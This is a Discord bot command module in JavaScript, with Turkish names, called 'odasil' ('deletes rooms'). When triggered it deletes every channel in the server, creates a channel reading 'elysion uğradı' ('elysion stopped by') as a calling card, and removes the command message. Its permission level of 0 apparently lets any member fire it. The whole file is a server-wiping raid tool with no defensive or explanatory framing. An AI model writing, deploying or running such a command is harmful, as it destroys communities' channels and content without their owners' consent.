const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {

message.guild.channels.deleteAll("");
 }

    message.guild.createChannel(`elysion uğradı`)
  
  
  

message.delete()
};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['os'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'odasil',
  description: 'Odaları siler.', 
  usage: 'Odasil'
};